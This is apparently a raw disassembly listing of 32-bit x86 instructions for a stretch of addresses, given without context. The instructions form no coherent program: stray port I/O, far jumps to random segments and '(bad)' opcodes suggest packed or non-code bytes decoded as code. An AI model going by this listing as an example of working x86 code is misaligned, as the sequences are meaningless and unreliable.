  42376d:	pop    ebx
  42376e:	mov    bl,0x72
  423770:	mov    edi,0x56f695ac
  423775:	xor    BYTE PTR [ebx],dl
  423777:	in     eax,dx
  423778:	nop
  423779:	out    0xed,eax
  42377b:	fdivr  QWORD PTR [ecx-0x71]
  42377e:	jne    0x423790
  423780:	test   BYTE PTR [edx+edi*2],al
  423783:	lea    ecx,[esi]
  423785:	pusha  
  423786:	inc    ecx
  423787:	xchg   ecx,eax
  423788:	jo     0x423734
  42378a:	iret   
  42378b:	inc    ebp
  42378c:	fstp   TBYTE PTR [edi+0x3d]
  42378f:	xchg   ebp,eax
  423790:	outs   dx,BYTE PTR ds:[esi]
  423791:	jmp    0x4b05:0x4853d752
  423798:	push   0xffffffe4
  42379a:	sbb    bl,BYTE PTR [eax+0x1c]
  42379d:	sub    BYTE PTR [edi-0x2e],ah
  4237a0:	sti    
  4237a1:	jmp    0xa5df:0xe0a70529
  4237a8:	sbb    BYTE PTR [esi+0x19],dh
  4237ab:	sub    esi,DWORD PTR ds:0x827626ba
  4237b1:	cmp    BYTE PTR [eax],0x7d
  4237b4:	mov    ds:0xf5c48f1,eax
  4237b9:	xchg   ebx,eax
  4237ba:	adc    ah,BYTE PTR [edx]
  4237bc:	push   esi
  4237bd:	sub    al,0x7f
  4237bf:	mov    ah,0xfc
  4237c1:	jne    0x4237a3
  4237c3:	mov    ecx,0x5a6c0ca4
  4237c8:	les    edi,FWORD PTR [ebp-0x6b5d8d7c]
  4237ce:	mov    eax,ds:0xd70a466f
  4237d3:	fwait
  4237d4:	sbb    eax,DWORD PTR [edi+eax*4+0x1]
  4237d8:	push   es
  4237d9:	push   edx
  4237da:	fwait
  4237db:	or     ecx,edi
  4237dd:	sbb    DWORD PTR [ebx-0x3f0b752f],edx
  4237e3:	inc    edx
  4237e4:	xchg   esp,eax
  4237e5:	jmp    0x9e6e:0xecb65b23
  4237ec:	xchg   BYTE PTR [eax+esi*2-0x39],al
  4237f0:	lea    ebx,[edi-0x2d268c50]
  4237f6:	retf   0xfff3
  4237f9:	add    ebx,DWORD PTR [edi-0x20b833f9]
  4237ff:	gs or  eax,0x331daa74
  423805:	jle    0x42383a
  423807:	pop    ds
  423808:	xchg   esp,eax
  423809:	mov    ecx,0x3c81ae84
  42380e:	pop    ebx
  42380f:	push   0x8b0b0c8d
  423814:	sti    
  423815:	(bad)  
  423816:	or     ch,cl
  423818:	adc    al,0xb3
  42381a:	test   DWORD PTR [ebx+0x1511487a],ebx
  423820:	inc    esi
  423821:	xor    BYTE PTR [ebx],bl
  423823:	sbb    al,0x9e
  423825:	jmp    0x423826
  423827:	(bad)  
  423828:	leave  
  423829:	out    dx,eax
  42382a:	mov    al,ds:0x369c2e4c
  42382f:	pop    es
  423830:	out    dx,eax
  423831:	dec    eax
  423832:	into   
  423833:	xchg   esp,eax
  423834:	int3   
  423835:	jne    0x423842
  423837:	aad    0x83
  423839:	and    esi,eax
  42383b:	xor    bl,BYTE PTR [edi]
  42383d:	cld    
  42383e:	cdq    
  42383f:	cmp    DWORD PTR [esi-0x697712f5],0x14ba0971
  423849:	cmp    eax,DWORD PTR [eax]
  42384b:	inc    ebx
  42384c:	add    edi,edx
  42384e:	pop    edi
  42384f:	jecxz  0x423802
  423851:	mov    esp,0x12deb02
  423856:	ss in  al,0xc7
  423859:	es jl  0x42383a
  42385c:	daa    
  42385d:	ds icebp 
  42385f:	int    0x5c
  423861:	push   0x1a2cd7e3
  423866:	mov    esp,0x5f7b205a
  42386b:	xchg   ebx,eax
  42386c:	mov    dh,0xb3
  42386e:	cmp    edi,DWORD PTR [eax+0x4635b85d]
  423874:	lods   al,BYTE PTR ds:[esi]
  423875:	nop
  423876:	paddusw mm7,QWORD PTR [ebp-0x66]
  42387a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42387b:	adc    eax,0x8a768fbd
  423880:	stc    
  423881:	lods   al,BYTE PTR ds:[esi]
  423882:	adc    eax,0xe6472e40
  423887:	push   DWORD PTR [edi-0x5ece1941]
  42388d:	xor    al,0x23
  42388f:	jbe    0x423861
  423891:	dec    ebx
  423892:	ja     0x42384e
  423894:	push   edi
  423895:	outs   dx,DWORD PTR cs:[esi]
  423897:	jns    0x4238d2
  423899:	mov    edi,DWORD PTR [ecx+0x2371bdb9]
  42389f:	call   0x24a8:0xc01cfa8e
  4238a6:	push   edx
  4238a7:	dec    ebp
  4238a8:	and    ah,ch
  4238aa:	sbb    al,0x54
  4238ac:	sub    esi,edx
  4238ae:	and    ebp,DWORD PTR [ecx]
  4238b0:	mov    dh,0xe4
  4238b2:	into   
  4238b3:	repnz arpl WORD PTR [eax],bx
  4238b6:	lock sub BYTE PTR [edx+0x52118cd1],ah
  4238bd:	jecxz  0x423926
  4238bf:	fs mov al,0xec
  4238c2:	mov    esi,0xcb97058f
  4238c7:	mov    dl,0xaa
  4238c9:	gs ins BYTE PTR es:[edi],dx
  4238cb:	imul   ebx,eax,0xffffff8c
  4238ce:	ror    DWORD PTR [edi+0x2fb2f435],0x5c
  4238d5:	jmp    0x423951
  4238d7:	pop    esp
  4238d8:	xchg   ebp,eax
  4238d9:	and    edx,DWORD PTR [edi]
  4238db:	inc    ecx
  4238dc:	cld    
  4238dd:	adc    DWORD PTR [edx+0x3869742a],edx
  4238e3:	gs fdiv st,st(2)
  4238e6:	and    BYTE PTR [eax+eax*2+0x62],bh
  4238ea:	xlat   BYTE PTR ds:[ebx]
  4238eb:	push   ebp
  4238ec:	inc    ecx
  4238ed:	aam    0x0
	...
  4238f7:	add    BYTE PTR [eax],al
  4238f9:	add    ch,bl
  4238fb:	cmp    al,0x8f
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423907:	rol    edx,1
  423909:	data16 test al,0xb2
  42390c:	add    DWORD PTR [eax],eax
  42390e:	cld    
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [ebx-0x7d3910e2],al
  423917:	hlt    
  423918:	popf   
  423919:	nop
  42391a:	adc    eax,0x391261a2
  42391f:	ret    0x245f
  423922:	and    al,0x4f
  423924:	push   ecx
  423925:	add    DWORD PTR [edx],ecx
  423927:	pop    es
  423928:	(bad)  
  423929:	xchg   ebx,eax
  42392a:	and    bl,ah
  42392c:	adc    eax,0x30361550
  423931:	inc    ebp
  423932:	mov    edi,0x5901cb9e
  423937:	add    al,0x2e
  423939:	add    al,0x8c
  42393b:	push   edx
  42393c:	scas   al,BYTE PTR es:[edi]
  42393d:	pop    ss
  42393e:	retf   0x57fa
  423941:	lods   al,BYTE PTR ds:[esi]
  423942:	inc    ebp
  423943:	or     DWORD PTR [ebx+0x5e],ecx
  423946:	test   al,0x4b
  423948:	lods   eax,DWORD PTR ds:[esi]
  423949:	out    0x63,al
  42394b:	call   0x240:0x3bd25bf8
  423952:	std    
  423953:	call   0x7563:0x5756afee
  42395a:	xor    ecx,DWORD PTR [ebx-0x50]
  42395d:	(bad)  
  42395e:	sub    al,0x5d
  423960:	push   0x872546c6
  423965:	call   0xaf:0xe2c2d6f0
  42396c:	or     al,0xa2
  42396e:	outs   dx,BYTE PTR ds:[esi]
  42396f:	adc    ch,0xbf
  423972:	sub    ebx,DWORD PTR [ebx+eiz*1]
  423975:	mov    ebp,0x770d613f
  42397a:	out    dx,eax
  42397b:	mov    esi,0x455d141c
  423980:	je     0x42395c
  423982:	jecxz  0x42391a
  423984:	pop    edi
  423985:	mov    dl,0x51
  423987:	(bad)  
  423988:	and    DWORD PTR [edi],edx
  42398a:	aaa    
  42398b:	xor    ch,ah
  42398d:	xchg   ebp,eax
  42398e:	test   BYTE PTR [esi+eiz*1+0x2e],al
  423992:	sub    ecx,ebp
  423994:	pushf  
  423995:	xor    DWORD PTR [eax+0x26],0x25
  423999:	inc    edi
  42399a:	cmp    ah,BYTE PTR [esi+edi*8+0x55f70ff]
  4239a1:	fcomp  DWORD PTR [ebp+0x1d637e14]
  4239a7:	sti    
  4239a8:	ja     0x4239a3
  4239aa:	loope  0x423984
  4239ac:	sbb    edi,0x5a287277
  4239b2:	cmp    BYTE PTR [eax+0x3b2d9610],dh
  4239b8:	scas   eax,DWORD PTR es:[edi]
  4239b9:	pop    ebx
  4239ba:	jmp    0x8312:0x4bfe3f34
  4239c1:	les    ebx,FWORD PTR [ebx+0x4b]
  4239c4:	mov    edx,0xefb2af83
  4239c9:	enter  0xe622,0xab
  4239cd:	(bad)  
  4239ce:	fistp  DWORD PTR [edi+0x65aedbc6]
  4239d4:	fbstp  TBYTE PTR [edx-0x7b]
  4239d7:	push   ds
  4239d8:	mov    esi,0xf53d99c
  4239dd:	mov    dl,0x2
  4239df:	(bad)  
  4239e0:	xchg   esi,eax
  4239e1:	jb     0x4239f1
  4239e3:	in     al,dx
  4239e4:	pusha  
  4239e5:	push   es
  4239e6:	loop   0x423a59
  4239e8:	lods   al,BYTE PTR ds:[esi]
  4239e9:	pop    ecx
  4239ea:	dec    esp
  4239eb:	addr16 call 0x8519:0x1bfc446b
  4239f3:	cs loope 0x423a67
  4239f6:	push   ebx
  4239f7:	cmp    BYTE PTR [ecx-0x1d],cl
  4239fa:	pop    es
  4239fb:	mov    edi,0xd81a2831
  423a00:	test   BYTE PTR [eax+0x1f],dl
  423a03:	icebp  
  423a04:	int3   
  423a05:	push   eax
  423a06:	lods   eax,DWORD PTR ds:[esi]
  423a07:	or     bl,0x9b
  423a0a:	aaa    
  423a0b:	aas    
  423a0c:	push   es
  423a0d:	retf   
  423a0e:	call   0x5ce8:0x948d6313
  423a15:	ror    BYTE PTR ds:0x82c438fd,cl
  423a1b:	mov    edx,0x2958753c
  423a20:	daa    
  423a21:	xor    ch,BYTE PTR [edi-0x3]
  423a24:	inc    edi
  423a25:	cmp    eax,0x104f8691
  423a2a:	mov    BYTE PTR [esi-0x60],ah
  423a2d:	xchg   ecx,eax
  423a2e:	sub    eax,DWORD PTR [edx-0x14]
  423a31:	jmp    0x97cb:0x7080b3c7
  423a38:	ins    DWORD PTR es:[edi],dx
  423a39:	sbb    cl,ah
  423a3b:	inc    eax
  423a3c:	xchg   edi,eax
  423a3d:	mov    ds:0xba4a2800,al
  423a42:	pop    edx
  423a43:	popf   
  423a44:	add    bh,BYTE PTR [edi-0x75]
  423a47:	pusha  
  423a48:	je     0x423a3a
  423a4a:	sahf   
  423a4b:	data16 int 0x32
  423a4e:	push   0x23
  423a50:	or     bh,ah
  423a52:	loopne 0x423aa1
  423a54:	jae    0x423a21
  423a56:	(bad)  
  423a57:	push   0x27dfc390
  423a5c:	jbe    0x423a86
  423a5e:	inc    esi
  423a5f:	sbb    eax,0x5eb18d20
  423a64:	xchg   esp,eax
  423a65:	ret    
  423a66:	jmp    0x25e7838c
  423a6b:	sub    BYTE PTR ds:0x5ec0b4ff,dl
  423a71:	add    esp,DWORD PTR [edx-0x1d]
  423a74:	pop    edi
  423a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a76:	in     al,0x98
  423a78:	test   DWORD PTR [esi],ebx
  423a7a:	fs fwait
  423a7c:	nop
  423a7d:	(bad)  
  423a7e:	(bad)  
  423a7f:	pop    esp
  423a80:	stos   DWORD PTR es:[edi],eax
  423a81:	lods   al,BYTE PTR ds:[esi]
  423a82:	sbb    al,0xcf
  423a84:	jno    0x423ad3
  423a86:	xchg   ebp,eax
  423a87:	dec    ecx
  423a88:	outs   dx,DWORD PTR ds:[esi]
  423a89:	rol    edx,1
  423a8b:	jmp    0xfc3e:0xdc779e87
  423a92:	shl    BYTE PTR [eax],0x88
  423a95:	retf   
  423a96:	repnz inc eax
  423a98:	xchg   ebx,eax
  423a99:	and    al,0x60
  423a9b:	pop    ebp
  423a9c:	js     0x423a23
  423a9e:	or     BYTE PTR [ebp+0x4f1f52c6],dh
  423aa4:	add    DWORD PTR [eax+0x292b72de],ecx
  423aaa:	lds    ebx,FWORD PTR [eax+0xb]
  423aad:	cs (bad) 
  423aaf:	shr    BYTE PTR [ebp+0x4b501855],1
  423ab5:	imul   BYTE PTR [ecx-0x7b]
  423ab8:	jnp    0x423b38
  423aba:	aad    0xe2
  423abc:	repnz xor BYTE PTR [ecx+0x21],bl
  423ac0:	sbb    edx,ebx
  423ac2:	clc    
  423ac3:	clc    
  423ac4:	ret    0x54d1
  423ac7:	xchg   ebp,eax
  423ac8:	jb     0x423adf
  423aca:	dec    edi
  423acb:	packssdw mm6,QWORD PTR [eax]
  423ace:	jne    0x423aef
  423ad0:	jle    0x423af1
  423ad2:	mov    ds:0x99388196,al
  423ad7:	pusha  
  423ad8:	xor    al,0x67
  423ada:	and    esi,DWORD PTR [esi+0x2a]
  423add:	dec    DWORD PTR [ebp+0x2a]
  423ae0:	jb     0x423aa9
  423ae2:	and    eax,DWORD PTR [ebx-0x2f]
  423ae5:	int    0x7c
  423ae7:	fistp  DWORD PTR [ecx+0x28066cbc]
  423aed:	add    edx,DWORD PTR [edi+0x6447cf29]
  423af3:	xchg   esp,eax
  423af4:	xor    dl,BYTE PTR [esi]
  423af6:	std    
  423af7:	mov    eax,0x6a8f4ba2
  423afc:	pop    eax
  423afd:	mov    ds:0x339b0fbe,eax
  423b02:	xor    eax,0x69d05533
  423b07:	outs   dx,DWORD PTR ds:[esi]
  423b08:	repnz imul edx,DWORD PTR [eax+0x14],0xffffffa4
  423b0d:	add    DWORD PTR [eax],eax
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b7e
  423b27:	add    bl,ch
  423b29:	in     eax,dx
  423b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b2b:	mov    ah,0x1
  423b2d:	add    ah,bh
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [ebp-0x1ceb762e],ch
  423b37:	mov    edx,0x8fae1da7
  423b3c:	mov    al,ds:0x2ac8170a
  423b41:	sbb    al,0x6
  423b43:	or     cl,cl
  423b45:	lds    ebp,FWORD PTR [eax]
  423b47:	jne    0x423b31
  423b49:	push   edx
  423b4a:	shl    DWORD PTR [ebp+0x2035f2dd],1
  423b50:	inc    ecx
  423b51:	sub    BYTE PTR [edx+0x7e],0xb8
  423b55:	xchg   ebp,eax
  423b56:	mov    edx,0x4939966c
  423b5b:	jecxz  0x423aec
  423b5d:	jg     0x423b19
  423b5f:	aaa    
  423b60:	loop   0x423bda
  423b62:	push   0x1c
  423b64:	pop    ebx
  423b65:	push   esp
  423b66:	imul   esp,DWORD PTR [ebp-0x21],0xffffffca
  423b6a:	adc    BYTE PTR [ecx],bh
  423b6c:	or     al,0x46
  423b6e:	push   esp
  423b6f:	and    eax,0x68ac66d3
  423b74:	lods   eax,DWORD PTR ds:[esi]
  423b75:	bound  ebx,QWORD PTR [eax-0x5779002e]
  423b7b:	mov    ah,0x8b
  423b7d:	fnstcw WORD PTR [eax-0x694104e5]
  423b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b84:	outs   dx,BYTE PTR ds:[esi]
  423b85:	int    0x93
  423b87:	daa    
  423b88:	pop    ds
  423b89:	stos   DWORD PTR es:[edi],eax
  423b8a:	jg     0x423bdc
  423b8c:	stos   DWORD PTR es:[edi],eax
  423b8d:	aad    0x4e
  423b8f:	cmp    al,BYTE PTR [ebx-0x419986a0]
  423b95:	(bad)  
  423b97:	lds    eax,FWORD PTR ds:0x8a620b3c
  423b9d:	cld    
  423b9e:	(bad)  
  423b9f:	jnp    0x423b6e
  423ba1:	div    DWORD PTR [eax+ebx*4-0x76]
  423ba5:	in     eax,0x4d
  423ba7:	add    eax,ecx
  423ba9:	cmp    BYTE PTR ds:0x7d5b0473,ah
  423baf:	lods   al,BYTE PTR ds:[esi]
  423bb0:	iret   
  423bb1:	cli    
  423bb2:	lea    ebx,[ebp+ebp*4-0x4c0c4948]
  423bb9:	adc    dh,BYTE PTR [esi]
  423bbb:	(bad)  
  423bbc:	es aaa 
  423bbe:	(bad)  [ecx]
  423bc0:	mov    ah,0x97
  423bc2:	pop    ebp
  423bc3:	aam    0x64
  423bc5:	and    eax,0x20924860
  423bca:	add    BYTE PTR [edi],0x7b
  423bcd:	lea    eax,[ebp+0x78]
  423bd0:	(bad)  
  423bd1:	pop    esp
  423bd2:	(bad)  
  423bd4:	jns    0x423b69
  423bd6:	repnz pop edi
  423bd8:	cmp    al,0x71
  423bda:	pop    es
  423bdb:	jne    0x423b85
  423bdd:	xor    DWORD PTR [ebx+ecx*2],ebx
  423be0:	ins    DWORD PTR es:[edi],dx
  423be1:	cmc    
  423be2:	jae    0x423bdc
  423be4:	mov    ch,0xd6
  423be6:	jae    0x423c09
  423be8:	lahf   
  423be9:	lods   eax,DWORD PTR ds:[esi]
  423bea:	in     eax,0x8b
  423bec:	add    ebp,DWORD PTR [ecx+ebx*2+0x16fa6c43]
  423bf3:	stos   DWORD PTR es:[edi],eax
  423bf4:	xor    bh,dl
  423bf6:	shr    BYTE PTR [ecx+0x3b],1
  423bf9:	pop    ebx
  423bfa:	add    eax,0x126cb264
  423bff:	imul   edi,DWORD PTR ds:0x3ad169db,0xffffffec
  423c06:	or     dh,ch
  423c08:	jb     0x423c21
  423c0a:	xor    edi,eax
  423c0c:	mov    edi,0xe6f5e82f
  423c11:	fld    TBYTE PTR [ecx+0x499202ab]
  423c17:	and    eax,0x319fe502
  423c1c:	jne    0x423c89
  423c1e:	repz adc al,0x54
  423c21:	push   esi
  423c22:	add    BYTE PTR [eax+0x0],bl
  423c25:	and    eax,DWORD PTR [eax+edi*1-0x14910496]
  423c2c:	pop    es
  423c2d:	pop    edi
  423c2e:	sub    DWORD PTR [ebp+0x29],edx
  423c31:	xchg   ecx,ecx
  423c33:	addr16 ret 0x7529
  423c37:	jl     0x423c3e
  423c39:	adc    BYTE PTR [ebp+0x5f],bl
  423c3c:	jle    0x423c48
  423c3e:	repz fadd QWORD PTR [edi-0x3f]
  423c42:	dec    eax
  423c43:	push   ds
  423c44:	mov    fs,WORD PTR [edx+0x3f]
  423c47:	mov    edx,0xb50a70b2
  423c4c:	inc    esp
  423c4d:	(bad)  
  423c4e:	xor    al,0x5c
  423c50:	popf   
  423c51:	mov    eax,0x3a111a62
  423c56:	jns    0x423c42
  423c58:	arpl   WORD PTR [eax-0x7d],ax
  423c5b:	arpl   WORD PTR [ecx+0x3d],bx
  423c5e:	and    ebx,ebp
  423c60:	jg     0x423c34
  423c62:	or     al,0xb1
  423c64:	pop    ebp
  423c65:	ss cmc 
  423c67:	dec    edx
  423c68:	mov    ah,0x7
  423c6a:	xchg   ecx,eax
  423c6b:	in     eax,0x65
  423c6d:	dec    edi
  423c6e:	in     eax,0xc7
  423c70:	cwde   
  423c71:	push   edi
  423c72:	xchg   ebx,eax
  423c73:	cdq    
  423c74:	fwait
  423c75:	scas   eax,DWORD PTR es:[edi]
  423c76:	jbe    0x423cc7
  423c78:	xchg   ebx,eax
  423c79:	sbb    DWORD PTR [ebp+0x4828527b],ebp
  423c7f:	out    0xf1,eax
  423c81:	out    0x58,al
  423c83:	outs   dx,DWORD PTR ds:[esi]
  423c84:	pop    ebp
  423c85:	and    eax,0x80bfc9b1
  423c8a:	pop    ss
  423c8b:	loopne 0x423cf2
  423c8d:	mov    ch,al
  423c8f:	fcomp  QWORD PTR [edi-0x76]
  423c92:	dec    edx
  423c93:	out    dx,al
  423c94:	cs data16 (bad) 
  423c97:	mov    DWORD PTR [edi],eax
  423c99:	dec    edx
  423c9a:	(bad)  
  423c9b:	out    0x16,eax
  423c9d:	xor    dl,BYTE PTR [edx+0x993e061]
  423ca3:	out    0x68,al
  423ca5:	inc    ecx
  423ca6:	lock mov ds:0xdd53ab88,al
  423cac:	ds sbb eax,0xf7859ea7
  423cb2:	xchg   ebp,eax
  423cb3:	jo     0x423c5f
  423cb5:	mov    BYTE PTR [esi+edi*2],bl
  423cb8:	push   ebp
  423cb9:	sbb    eax,0x36495c45
  423cbe:	add    eax,0xe81f23c4
  423cc3:	inc    edx
  423cc4:	cmc    
  423cc5:	ret    
  423cc6:	push   edx
  423cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cc8:	dec    ecx
  423cc9:	js     0x423ca3
  423ccb:	ja     0x423d2b
  423ccd:	lods   eax,DWORD PTR cs:[esi]
  423ccf:	out    0x89,eax
  423cd1:	jge    0x423c53
  423cd3:	cs nop
  423cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cd6:	test   eax,0x1d04a4b0
  423cdb:	xchg   ah,dl
  423cdd:	test   DWORD PTR [edi+0x67],ecx
  423ce0:	(bad)  
  423ce1:	das    
  423ce2:	test   eax,0x13237924
  423ce7:	dec    edx
  423ce8:	mov    DWORD PTR gs:[ecx+0xb],esi
  423cec:	jno    0x423cf6
  423cee:	cmc    
  423cef:	loop   0x423cd3
  423cf1:	das    
  423cf2:	xchg   ecx,eax
  423cf3:	in     eax,0x8f
  423cf5:	sub    BYTE PTR [edx-0x19],ah
  423cf8:	repnz cmp edx,eax
  423cfb:	or     al,0x7d
  423cfd:	test   eax,0xe76da210
  423d02:	enter  0x4fc5,0x51
  423d06:	lds    ebp,FWORD PTR gs:[eax-0x2e199d1f]
  423d0d:	xor    bh,BYTE PTR [ebx-0x397230f4]
  423d13:	cld    
  423d14:	loop   0x423d94
  423d16:	xchg   esp,eax
  423d17:	xlat   BYTE PTR ds:[ebx]
  423d18:	add    eax,0xefc391dc
  423d1d:	popa   
  423d1e:	or     BYTE PTR [ebx],bh
  423d20:	jno    0x423d67
  423d22:	imul   DWORD PTR [esi-0x257d71b]
  423d28:	ins    DWORD PTR es:[edi],dx
  423d29:	into   
  423d2a:	sti    
  423d2b:	and    ebx,DWORD PTR [edx+0x7a]
	...
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0xe857ffb2
  423d47:	cdq    
  423d48:	and    DWORD PTR [ebx],esp
  423d4a:	mov    al,ds:0xfc0001b6
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    bh,al
  423d53:	mov    ah,0x60
  423d55:	mov    ds:0x7d19dd18,eax
  423d5a:	ins    BYTE PTR es:[edi],dx
  423d5b:	test   DWORD PTR [edi],esi
  423d5d:	mov    ah,0x5
  423d5f:	sub    BYTE PTR [ebx],ch
  423d61:	pusha  
  423d62:	xor    al,0x16
  423d64:	add    eax,edi
  423d66:	cwde   
  423d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d68:	fstp   QWORD PTR [ebx+0x5a]
  423d6b:	les    ebp,FWORD PTR [esi+0x2a2962f9]
  423d71:	dec    esp
  423d72:	pand   mm6,QWORD PTR [ecx-0x13]
  423d76:	xchg   DWORD PTR [eax+esi*2-0x4ceaa0dd],eax
  423d7d:	mov    ebp,0x16ade0df
  423d82:	addr16 pop ss
  423d84:	fisttp DWORD PTR [ecx-0x39651d81]
  423d8a:	ficomp DWORD PTR [edi-0xdf5db88]
  423d90:	ret    
  423d91:	in     eax,dx
  423d92:	ss loop 0x423de1
  423d95:	sahf   
  423d96:	pop    ss
  423d97:	test   eax,0x17957659
  423d9c:	adc    DWORD PTR [ebp+0x1a],esp
  423d9f:	test   BYTE PTR [ebx],0x84
  423da2:	xor    al,0x4
  423da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423da5:	and    bl,BYTE PTR [edx+ebx*2-0x13]
  423da9:	aad    0x5f
  423dab:	dec    edx
  423dac:	cmp    bl,ah
  423dae:	sbb    al,0x5
  423db0:	popa   
  423db1:	mov    esp,DWORD PTR [ebx-0x77fe2613]
  423db7:	cmp    al,0x34
  423db9:	push   0xf52e9a00
  423dbe:	in     al,0x7f
  423dc0:	mov    ds:0x123360e9,al
  423dc5:	scas   al,BYTE PTR es:[edi]
  423dc6:	loopne 0x423d5f
  423dc8:	mov    dh,0x7
  423dca:	daa    
  423dcb:	loope  0x423e1e
  423dcd:	push   edx
  423dce:	cmp    eax,0xce82e138
  423dd3:	xchg   ebx,eax
  423dd4:	dec    edx
  423dd5:	in     eax,0x83
  423dd7:	lea    eax,[ebx+ecx*2]
  423dda:	(bad)  
  423ddb:	push   esi
  423ddc:	loopne 0x423dba
  423dde:	pusha  
  423ddf:	sub    ebp,esi
  423de1:	xor    BYTE PTR [ecx],ah
  423de3:	pop    edi
  423de4:	adc    eax,DWORD PTR [edx-0x47]
  423de7:	fdivr  QWORD PTR [eax-0x78]
  423dea:	adc    eax,0xb19efb8c
  423def:	jl     0x423d83
  423df1:	nop    ebp
  423df4:	call   0xb0ab8421
  423df9:	cwde   
  423dfa:	setae  BYTE PTR [ebx]
  423dfd:	sub    DWORD PTR [edx-0x2c92054c],edi
  423e03:	cmp    DWORD PTR [eax+esi*1],ecx
  423e06:	out    dx,eax
  423e07:	mov    dh,0x18
  423e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e0a:	mov    edi,0x6a035b26
  423e0f:	jns    0x423e55
  423e11:	(bad)  
  423e13:	in     eax,0x68
  423e15:	loop   0x423e17
  423e17:	xor    dh,BYTE PTR [edi+0x6]
  423e1a:	jns    0x423e3a
  423e1c:	lods   eax,DWORD PTR ds:[esi]
  423e1d:	aas    
  423e1e:	mov    bh,0xf2
  423e20:	dec    esi
  423e21:	push   edx
  423e22:	jmp    0x423dde
  423e24:	mov    esi,0xa7fabd6a
  423e29:	aaa    
  423e2a:	sti    
  423e2b:	adc    eax,0xea674261
  423e30:	xor    DWORD PTR [edx+0x2d],eax
  423e33:	fild   DWORD PTR ds:0x7bcfabc9
  423e39:	daa    
  423e3a:	mov    bl,BYTE PTR [ecx-0x34]
  423e3d:	mov    ah,0x22
  423e3f:	mov    bl,0x12
  423e41:	jmp    0x8710e3c4
  423e46:	rcl    BYTE PTR [edi],0x7f
  423e49:	and    dl,0xff
  423e4c:	adc    eax,0xb7d2baf2
  423e51:	adc    DWORD PTR [eax],eax
  423e53:	loope  0x423e16
  423e55:	out    dx,al
  423e56:	lea    ebp,[ecx+0xa]
  423e59:	test   BYTE PTR [eax+0x35e6892e],bl
  423e5f:	pop    edi
  423e60:	ror    BYTE PTR [edx],1
  423e62:	imul   edi,DWORD PTR [edx-0x1237796e],0x42
  423e69:	dec    eax
  423e6a:	mov    ebp,0x2e1b40d8
  423e6f:	sbb    DWORD PTR [eax-0x30a285b4],0xffffffd3
  423e76:	jo     0x423ee4
  423e78:	mov    esi,0x4ab5673d
  423e7d:	shr    BYTE PTR [ebx],1
  423e7f:	push   cs
  423e80:	aaa    
  423e81:	scas   al,BYTE PTR es:[edi]
  423e82:	mov    ecx,0xed39a7f
  423e87:	sti    
  423e88:	lods   al,BYTE PTR ds:[esi]
  423e89:	dec    eax
  423e8a:	cmp    DWORD PTR [eax+0x62],ebp
  423e8d:	jbe    0x423e8b
  423e8f:	add    al,0xbd
  423e91:	(bad)  
  423e92:	mov    ebx,0x7b436531
  423e97:	inc    edi
  423e98:	or     ebp,DWORD PTR [ebx+0x6bb34a71]
  423e9e:	int3   
  423e9f:	and    DWORD PTR [eax+eax*1-0x54],ebp
  423ea3:	ret    
  423ea4:	mov    ebp,0xa1a71003
  423ea9:	ss in  eax,dx
  423eab:	aas    
  423eac:	xchg   esp,eax
  423ead:	test   al,0xc
  423eaf:	push   es
  423eb0:	cmp    BYTE PTR [ebx],al
  423eb2:	inc    eax
  423eb3:	dec    edi
  423eb4:	adc    DWORD PTR [eax+0x71d5707b],eax
  423eba:	inc    ebp
  423ebb:	sbb    ebx,eax
  423ebd:	ja     0x423e63
  423ebf:	shr    esi,1
  423ec1:	sti    
  423ec2:	aam    0xed
  423ec4:	or     BYTE PTR [ebp+0x6b],al
  423ec7:	pop    ebx
  423ec8:	test   al,0x63
  423eca:	inc    esp
  423ecb:	jmp    0xd3373a41
  423ed0:	rol    BYTE PTR [esi+0x24736c45],cl
  423ed6:	mov    dl,0x1d
  423ed8:	pop    edi
  423ed9:	shl    DWORD PTR [ebp-0x3e54ac68],cl
  423edf:	adc    bh,BYTE PTR [eax]
  423ee1:	or     edx,DWORD PTR [ebx+0x400582c2]
  423ee7:	aad    0x80
  423ee9:	call   0xada8:0xd70a5c0
  423ef0:	add    dh,BYTE PTR [edx+0xa]
  423ef3:	jl     0x423edf
  423ef5:	sub    al,0xcf
  423ef7:	push   ss
  423ef8:	fsubr  QWORD PTR ds:0xe3552afd
  423efe:	push   edi
  423eff:	lds    esp,FWORD PTR [ebx]
  423f01:	nop
  423f02:	wbinvd 
  423f04:	mov    gs,edi
  423f06:	repnz stc 
  423f08:	pop    ss
  423f09:	fidiv  DWORD PTR [edi-0x756e7b4b]
  423f0f:	js     0x423f8d
  423f11:	xor    DWORD PTR [eax+0x65],0x341d9aef
  423f18:	bound  ebp,QWORD PTR [ebx-0x67d1c165]
  423f1e:	popfw  
  423f20:	add    cl,0x20
  423f23:	icebp  
  423f24:	sbb    BYTE PTR [edi],ch
  423f26:	pop    edi
  423f27:	mov    esi,0xd7626467
  423f2c:	xchg   esi,eax
  423f2d:	add    eax,DWORD PTR [esi+eax*2+0xe22c936]
  423f34:	mov    eax,ds:0xd06be033
  423f39:	xor    BYTE PTR gs:[edx],dh
  423f3c:	mov    cl,0xd2
  423f3e:	ja     0x423ec1
  423f40:	jo     0x423ee1
  423f42:	repz mov al,ds:0xb752524c
  423f48:	dec    edx
  423f49:	into   
  423f4a:	imul   esp,DWORD PTR [ecx+0xdf22],0x0
  423f54:	add    BYTE PTR [eax],al
